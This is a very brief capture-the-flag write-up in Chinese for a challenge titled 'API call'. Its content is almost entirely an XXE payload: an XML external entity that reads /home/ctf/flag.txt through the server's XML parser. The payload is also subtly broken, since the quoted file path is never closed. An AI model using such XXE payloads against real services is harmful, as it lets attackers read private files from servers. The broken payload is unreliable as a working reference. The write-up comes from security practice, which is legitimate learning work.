# api调用

哇，你不和我讲我怎么知道是XXE啊。

知道是XXE就是套路题了。

```xml
<!DOCTYPE a [
    <!ENTITY b SYSTEM "file:///home/ctf/flag.txt>
]>
<c>&b;</c>
```
